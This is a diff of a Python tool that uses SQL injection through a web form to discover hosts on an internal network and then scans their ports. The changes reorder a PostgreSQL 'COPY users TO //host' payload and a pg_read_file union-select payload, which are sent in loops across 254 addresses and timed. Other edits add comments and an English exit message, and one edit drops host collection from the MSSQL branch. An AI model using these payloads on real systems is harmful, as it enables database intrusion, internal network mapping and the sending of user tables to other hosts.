@@ -4,7 +4,6 @@ import requests
 import argparse
 import time
 import re
-from os import path
 
 parser = argparse.ArgumentParser(description="Detector de argumentos")
 parser.add_argument(
@@ -16,11 +15,18 @@ parser.add_argument(
 parser = parser.parse_args()
 
 url = parser.target
+
+# list of top 20 TCP ports
 topPorts = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
             143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+
+# list without port 135
 curlPorts = [21, 22, 23, 25, 53, 80, 110, 111, 139, 143,
              443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+
+# ports with different behaviour with curl
 curlSpecialPorts = [21, 445, 3389]
+
 headers = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
     'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8'}
@@ -99,23 +105,7 @@ def mysql_scanner(ip):
 def psql_scanner(ip):
 
     hosts = []
-    print("--- Using COPY ---\n")
-    for i in range(1, 255):
-        host = ip + str(i)
-        query = "'; COPY users TO '//{}/tmp'; -- ".format(
-            host)
-        start_time = time.time()
-        requests.post(
-            url=url,
-            data={'product-name': query, 'submit': 'submit'},
-            headers=headers)
-        exec_time = time.time() - start_time
-
-        if exec_time <= 28:
-            print('Alive host: {}'.format(host))
-            hosts.append(host)
-
-    print("\n\n--- Using PG_READ_FILE() ---\n")
+    print("--- Using PG_READ_FILE() ---\n")
     for i in range(1, 255):
         host = ip + str(i)
         query = "' union all select null,pg_read_file('//{}/tmp') -- ".format(
@@ -130,6 +120,21 @@ def psql_scanner(ip):
         if exec_time <= 28:
             print('Alive host: {}'.format(host))
             hosts.append(host)
+
+    print("\n\n--- Using COPY ---\n")
+    for i in range(1, 255):
+        host = ip + str(i)
+        query = "'; COPY users TO '//{}/tmp'; -- ".format(
+            host)
+        start_time = time.time()
+        requests.post(
+            url=url,
+            data={'product-name': query, 'submit': 'submit'},
+            headers=headers)
+        exec_time = time.time() - start_time
+
+        if exec_time <= 28:
+            print('Alive host: {}'.format(host))
 
     if parser.ports:
         psql_port_scanner(hosts)
@@ -234,7 +239,6 @@ def mssql_scanner(ip):
 
         if exec_time <= 28:
             print('Alive host: {}'.format(host))
-            hosts.append(host)
 
     if parser.ports:
         mssql_port_scanner(hosts)
@@ -302,5 +306,5 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\nSaliendo...\n")
+        print("\n\Closing app...\n")
         exit()
